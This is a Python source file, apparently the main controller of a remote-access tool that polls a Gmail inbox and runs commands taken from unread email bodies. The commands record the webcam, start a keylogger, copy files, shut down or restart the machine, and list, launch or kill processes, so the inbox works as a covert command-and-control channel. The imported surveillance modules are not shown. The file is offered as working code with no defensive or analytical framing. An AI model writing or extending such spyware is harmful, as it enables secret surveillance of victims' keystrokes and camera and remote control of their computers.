# main.py
from modules import gmail_api, webcam_recorder, keylogger, file_transfer, process_manager, system_control
import time
import os

def handle_command(cmd):
    print(f"[+] Command: {cmd}")
    if 'webcam' in cmd:
        duration = int(cmd.split()[-1])
        path = webcam_recorder.record_webcam(duration)
        print(f"Record video: {path}")
    elif 'keylogger' in cmd:
        keylogger.start_keylogger()
        print("Open keylogger.")
    elif 'shutdown' in cmd:
        system_control.shutdown()
    elif 'restart' in cmd:
        system_control.restart()
    elif 'copy' in cmd:
        path = cmd.split(' ', 1)[1]
        print(file_transfer.copy_file(path))
    elif 'listproc' in cmd:
        procs = process_manager.list_processes()
        print("\n".join([f"{pid} - {name}" for pid, name in procs]))
    elif 'startapp' in cmd:
        app = cmd.split(' ', 1)[1]
        print(process_manager.start_app(app))
    elif 'killproc' in cmd:
        name = cmd.split(' ', 1)[1]
        print(process_manager.stop_process_by_name(name))

def main():
    service = gmail_api.authenticate()
    while True:
        emails = gmail_api.get_unread_emails(service)
        for email in emails:
            print("\n New Email:")
            print(f"From: {email['from']}")
            print(f"Time: {email['date']}")
            print(f"Title: {email['subject']}")
            print(f"Content: {email['body']}")

            cmd = email['body'].strip().lower()
            handle_command(cmd)
            gmail_api.mark_as_read(service, email['id'])
        time.sleep(10)

if __name__ == "__main__":
    main()